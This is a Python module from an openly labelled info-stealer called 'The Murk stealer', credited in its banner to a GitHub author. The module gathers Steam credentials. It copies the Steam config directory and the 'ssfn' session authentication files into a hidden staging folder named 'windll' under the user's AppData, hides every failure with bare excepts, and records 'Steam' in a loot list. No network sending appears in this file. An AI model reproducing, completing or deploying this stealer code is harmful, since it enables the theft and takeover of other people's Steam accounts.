#-----------------------------------------------------------------------------#
#       ████████╗██╗░░██╗███████╗  ███╗░░░███╗██╗░░░██╗██████╗░██╗░░██╗       #
#       ╚══██╔══╝██║░░██║██╔════╝  ████╗░████║██║░░░██║██╔══██╗██║░██╔╝       #
#       ░░░██║░░░███████║█████╗░░  ██╔████╔██║██║░░░██║██████╔╝█████═╝░       #
#       ░░░██║░░░██╔══██║██╔══╝░░  ██║╚██╔╝██║██║░░░██║██╔══██╗██╔═██╗░       #
#       ░░░██║░░░██║░░██║███████╗  ██║░╚═╝░██║╚██████╔╝██║░░██║██║░╚██╗       #
#       ░░░╚═╝░░░╚═╝░░╚═╝╚══════╝  ╚═╝░░░░░╚═╝░╚═════╝░╚═╝░░╚═╝╚═╝░░╚═╝       #
#                             by: Nick_Vinesmoke                              #
#                      https://github.com/Nick-Vinesmoke                      #
#             https://github.com/Nick-Vinesmoke/The-Murk-stealer              #
#-----------------------------------------------------------------------------#
from os import environ, sep,path,listdir
from shutil import copytree,copy

"""
all needed paths
"""
path2 = r'C:\Program Files\Steam'
path02 = r'C:\Program Files\Steam\config'
path3 = r'C:\Program Files (x86)\Steam'
path03 = r'C:\Program Files (x86)\Steam\config'

def Steam(data):
    try:
        try:
            pathtofile = environ['USERPROFILE'] + sep + r'AppData\Local'
            directory = rf'{pathtofile}\windll\Games\Steam\config'# some new dirs
            directory2 = rf'{pathtofile}\windll\Games\Steam'
            files2 = [i for i in listdir(path2) if path.isfile(path.join(path2,i)) and \
            'ssfn' in i]
            copytree(path02, directory)# copy dir
            copy(path2+'\\'+files2[0], directory2)# copy files
            copy(path2+'\\'+files2[1], directory2)
        except:
            pass
        try:
            files3 = [i for i in listdir(path3) if path.isfile(path.join(path3,i)) and \
            'ssfn' in i]
            copytree(path03, directory)
            copy(path3+'\\'+files3[0], directory2)# copy files
            copy(path3+'\\'+files3[1], directory2)
        except:
            pass
        data.append("\n∟🎮Steam")
        return data
    except:
        return data

